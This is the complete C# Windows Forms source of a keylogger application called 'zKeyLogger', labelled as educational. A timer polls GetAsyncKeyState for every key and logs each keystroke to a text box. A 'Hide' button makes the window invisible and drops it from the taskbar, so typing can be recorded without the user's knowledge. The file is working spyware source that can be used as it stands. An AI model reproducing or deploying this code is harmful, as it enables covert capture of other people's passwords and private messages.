using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace zKeyLogger
{
    public partial class Home : Form
    {
        public Home()
        {
            InitializeComponent();
            CenterToScreen();
        }


        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);


        private void copy_Click(object sender, EventArgs e)
        {
            if (log.Text != "")
            {
                Clipboard.SetText(log.Text);
                MessageBox.Show("Text Copied To Clipboard");
            }
        }

        private void clear_Click(object sender, EventArgs e)
        {
            log.Text = "";
        }

        private void about_Click(object sender, EventArgs e)
        {
            if (log.Text!="")
            {
            Clipboard.SetText(log.Text);
            MessageBox.Show("Text Copied To Clipboard");
            }
            log.Text = "";
            log.Text = "zKeyLogger is Key Logging Application."+Environment.NewLine+"Application Developed By: Zoeb Chhatriwala [for Educational Purpose Only]";
            
        }

        private void start_Click(object sender, EventArgs e)
        {
            stop.Visible = true;
            log.Text = "";
            key.Enabled = true;
            
        }

        private void stop_Click(object sender, EventArgs e)
        {
            stop.Visible = false;
            key.Enabled = false;
        }

       private void key_Tick(object sender, EventArgs e)
        {
            foreach(System.Int32 i in Enum.GetValues(typeof(Keys)))
			{
				if(GetAsyncKeyState(i) == -32767) 
				{

                    log.Text += Enum.GetName(typeof(Keys), i) + Environment.NewLine;
                    
                    
				}
			}	
        }

       private void notifyIcon1_MouseDoubleClick(object sender, MouseEventArgs e)
       {
           this.Opacity = 1;
           this.ShowInTaskbar = true;
       }

       private void Hide_Click(object sender, EventArgs e)
       {
           this.Opacity = 0;
           this.ShowInTaskbar = false;
           notifyIcon1.ShowBalloonTip(2000);

       }
        }
    }

